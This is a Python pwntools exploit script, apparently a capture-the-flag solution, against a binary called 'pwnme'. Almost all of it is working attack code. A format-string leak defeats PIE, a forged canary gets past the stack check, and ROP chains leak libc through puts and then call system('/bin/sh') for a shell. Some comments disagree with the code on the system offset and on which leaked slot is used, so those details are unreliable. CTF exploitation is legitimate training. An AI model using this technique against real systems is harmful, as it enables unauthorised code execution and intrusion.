from pwn import *

def start(argv=[], *a, **kw):
    if args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else: 
        return process([exe] + argv, *a, **kw)

# Binary filename
exe = './pwnme'

elf = context.binary = ELF(exe, checksec=False)

# Useful for seeing raw io data
context.log_level = 'debug'

# Exploit starts here
io = start()

# This solution is a manual approach to exploiting the challenge.
# To make things easier, you could have used pwntools to automatically calculate the libc addresses instead of leaking the got puts address. 

# RIP offset is at 88 - found using gdb
# Format string vuln:
# Note: ASLR was turned off during the following steps.
# 12: b'0x555555557d80\n' looks constant

# We can use pwndbg to dump the pie base
# Pie base: Calculated VA from /home/will/CTF-Challenge-2/src/pwnme = 0x555555554000

# If we calculate the difference between our leaked address and our actual pie base
# We find an offset that will always point us to the pie base.
# 0x555555557d80 - 0x555555554000 = 0x3D80
# 36th element - 0x3D80 = PIEBASE

# Calculated custom canary hash for username %36$p\n
# This can be found by reverse engineering the secret() function
# 0xf6a79be29a5012d8

# We want to leak an address from the stack using the format string vuln.
# The only issue is that the program is base64 decoding our killcode.
# As indicated above, #36 looks the most promising.
# base64(%36$p) = JTM2JHA=
io.sendlineafter(b'[SYSTEM] Enter your personal killcode:\n', "JTM2JHA=", 16)
io.recvuntil(b'[INFO] validating the following killcode:\n')
leaked_addr = int(io.recvline(),16)
info("Leaked address: %#x", leaked_addr)

# Calculate PIE BASE
# The offset is constant even with ASLR enabled. 
# As long as we are using the same libc version
# This offset was calculated above
elf.address = leaked_addr - 0x3D80
info("Piebase: %#x", elf.address)

# Adjusted RIP offset 
# given that we need an extra 8 bytes for our fake canary at offset 72
# and then 8 bytes of padding.
rip_offset = 72

# Found using ropper or ROPgadgets
pop_rdi_offset = 0x153e

# Calculate the true address of the gadget
pop_rdi = elf.address + pop_rdi_offset

# Leak libc address
payload = flat(
    {
    rip_offset: [
        p64(0xf6a79be29a5012d8), # Custom canary given that we are leaking 36th address.
        b'B'*8, # Padding
        pop_rdi, # RDI Gadget
        elf.got.puts, # Pop got puts into RDI
        elf.plt.puts, # Call puts() to leak got.puts
        elf.address + 0x14ed # Return to our vuln BOF function for a second overflow
    ]
    }
)

io.sendlineafter(b'[SYSTEM] Provide 2FA code:\n', payload)

# Grab the address of GOT PUTS
got_puts = unpack(io.recv()[:6].ljust(8, b'\x00'))
info("Leaked got_puts: %#x", got_puts)

# Calculate libc base addr from the puts addr
# readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep puts
# 235: 0000000000087bd0   550 FUNC    WEAK   DEFAULT   17 puts@@GLIBC_2.2.5
# To find the offset of libc_base, system and binsh for a remote server, we can use https://libc.blukat.me and provide the leaked got_puts address.
# All libc offsets are constant for the version used in the docker.
libc_base = got_puts - 0x87bd0
info("libc_base: %#x", libc_base)

# Calculate the system address
# readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep system
# 1050: 0000000000058750    45 FUNC    WEAK   DEFAULT   17 system@@GLIBC_2.2.5
system_addr = libc_base + 0x58740
info("system_addr: %#x", system_addr)

# Calculate /bin/sh from libc
# strings -a -t x //lib/x86_64-linux-gnu/libc.so.6 | grep /bin/sh
# 1cb42f /bin/sh
bin_sh = libc_base + 0x1cb42f
info("bin_sh: %#x", bin_sh)

# Extra return gadget to align the stack.
# Offset is constant
ret = elf.address + 0x0101a

# Get a shell - system("/bin/sh")
payload = flat(
    {
    rip_offset: [
        p64(0xf6a79be29a5012d8), # Custom canary given that we are leaking 12th address. 
        b'B'*8, # Padding
        ret, # Return gadget
        pop_rdi, # RDI gadget
        bin_sh, # pop /bin/sh in RDI
        system_addr, # Call system()
    ]
    }
)

io.sendline(payload)
io.interactive()
